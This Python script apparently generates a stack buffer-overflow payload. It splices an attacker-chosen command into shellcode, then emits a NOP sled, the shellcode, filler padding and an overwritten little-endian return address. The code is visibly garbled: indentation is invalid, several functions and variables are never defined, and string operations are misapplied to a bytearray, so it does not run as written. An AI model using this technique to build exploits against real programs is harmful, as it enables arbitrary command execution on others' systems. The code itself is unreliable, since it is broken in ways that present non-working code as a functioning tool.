TEMPLATE_FILE = "modifiedcode.asm"
import os


if __name__ == "__main__":
import sys 
    if len(sys.argv) == 4:
    address = bytes.fromhex(sys.argv[1])[::-1] #reverse for little-endian (Stack)
    shellcodeFile = sys.argv[2]
    command = sys.argv[3]
else:
    print("Usage:", sys.argv[0], "return_address(&buffer) shellcode_filename command")
    sys.exit(1)
f = open(TEMPLATE_FILE, "rb")
asm = bytearray(f.read())
f.close()

xor_offset, db_string = prepare_command(command)

asm = asm.index("XOR_OFFSET", str(xor_offset))
asmOffset = asm - 1
commandBytes = command.encode("ascii")
shellcode = shellcode.replace("REPLACE_ME".encode("ascii"), commandBytes + b"\x0a")
shellcode[sizeOffset] = len(commandBytes).to_bytes()[0]
bufferSize = 200
nopSled = b"\x90" * 16
paddingSize = 16
padding = b"A" * (bufferSize - len(nopSled) - len(shellcode) + paddingSize)
os.write(1, nopSled + shellcode + padding + address)

